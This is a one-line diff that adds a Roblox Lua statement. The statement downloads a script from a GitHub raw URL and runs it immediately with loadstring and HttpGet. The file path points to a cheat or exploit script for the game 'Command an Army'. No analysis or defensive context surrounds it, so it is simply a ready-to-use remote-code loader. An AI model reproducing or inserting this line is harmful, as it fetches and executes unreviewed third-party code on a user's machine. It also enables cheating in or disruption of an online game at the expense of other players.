@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/upd-command-an-army-spam1-b68695mao3yuxl.lua"))()
